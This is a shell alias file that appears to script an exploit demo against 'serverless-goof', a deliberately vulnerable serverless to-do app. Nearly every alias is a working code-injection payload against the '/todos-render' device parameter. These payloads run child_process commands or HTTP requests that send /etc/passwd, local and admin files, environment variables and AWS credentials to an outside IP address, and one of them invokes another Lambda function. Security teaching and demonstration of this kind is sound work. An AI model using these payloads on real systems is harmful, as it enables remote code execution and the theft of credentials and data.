# Simple request
alias dust1="curl $SERVERLESS_GOOF_HOST'/todos-render?device=Desktop' | tidy -iq"

# Request with array
alias dust2="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop' | tidy -iq"

# Trigger error
alias dust3="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27'"

# Simple RCE, logs to console
alias dust4="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-console.log(%27Guypo%20Was%20Here%27)-%27'"

# RCE sends file out
alias dust5="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27child_process%27).execSync(%27curl%20-m%203%20-F%20%22x%3D%60cat%20%2Fetc%2Fpasswd%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'"
# Original payload: '-require('child_process').execSync('curl -m 3 -F "x=`cat /etc/passwd`" http://34.205.135.170/')-'

# List local files
alias dust6="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27child_process%27).execSync(%27curl%20-m%203%20-F%20%22x%3D%60ls%20-l%20.%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'"

# Cat admin files
alias dust7="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27child_process%27).execSync(%27curl%20-m%203%20-F%20%22x%3D%60cat%20./admin/*%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'"

# Since we have an RCE, keeping secrets in config doesn't help... Get env
alias dust8="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27child_process%27).execSync(%27curl%20-m%203%20-F%20%22x%3D%60env%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'"

# Can also get AWS credentials
alias dust9="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27http%27).request(%27http%3A%2F%2F34.205.135.170%27).write(JSON.stringify(require(%27aws-sdk%27).config.credentials))-%27'"
# Original payload: '-require('http').request('http://34.205.135.170').write(JSON.stringify(require('aws-sdk').config.credentials))-'

# Invoke another function
alias dust10="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-new%20function()%7Bvar%20x%20%3D%20require(%27aws-sdk%27)%3Bnew%20x.Lambda().invoke(%7BFunctionName%3A%20%22serverless-goof-dev-internalRestore%22%7D%2Cfunction(e%2Cd)%20%7B%7D)%3B%7D()%3B-%27'"
# Original payload: new function(){var x = require('aws-sdk');new x.Lambda().invoke({FunctionName: "serverless-goof-dev-internalRestore"},function(e,d) {});}();

# List tmp files
alias dust11="curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop%27-require(%27child_process%27).execSync(%27curl%20-m%203%20-F%20%22x%3D%60ls%20-l%20%2Ftmp%2F%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'"
# Original payload: '-require('child_process').execSync('curl -m 3 -F "x=`ls -l /tmp/`" http://34.205.135.170/')-'
